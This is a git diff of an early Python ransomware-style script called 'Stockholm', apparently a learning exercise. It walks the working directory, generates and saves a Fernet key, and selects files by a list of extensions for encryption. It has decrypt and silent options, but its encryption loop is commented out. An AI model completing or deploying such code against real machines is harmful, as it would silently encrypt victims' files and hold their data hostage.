@@ -6,18 +6,21 @@ import sys
 import os
 
 def encrypt() :
+	with open("extensions", "r") as f:
+		extensions = [i.strip() for i in f.readlines() if i.strip()]
 	curr_dir = os.getcwd()
 	key = Fernet.generate_key()
-	with open("key.key", "wb") as key_file:
+	with open("key", "wb") as key_file:
 		key_file.write(key)
 	f = Fernet(key)
 	files = []
 	for (curr_dir, dir_names, file_names) in os.walk(curr_dir):
 		files_tmp = [f"{curr_dir}/{i}" for i in file_names]
 		files.extend(files_tmp)
-	for i in files:
-		with open(files[i], "wrb") as f:
-			f.encrypt(f.read())
+	to_encrypt = [file for file in files if os.path.splitext(file)[1].lower() in extensions]
+	# for i in files:
+		# with open(i, "wrb") as f:
+		# 	f.encrypt(f.read())
 	
 
 def main() :
@@ -32,8 +35,6 @@ def main() :
 		parser.add_argument("-r", "--reverse", metavar="KEY", type=str, help="decrypt files")
 		parser.add_argument("-s", "--silent", help="do not display anything", action="store_true")
 		args = parser.parse_args()
-		with open("extensions", "r") as f:
-			extensions = [i.strip() for i in f.readlines() if i.strip()]
 		if args.version :
 			print("Stockholm: v0.01")
 		if not args.reverse :
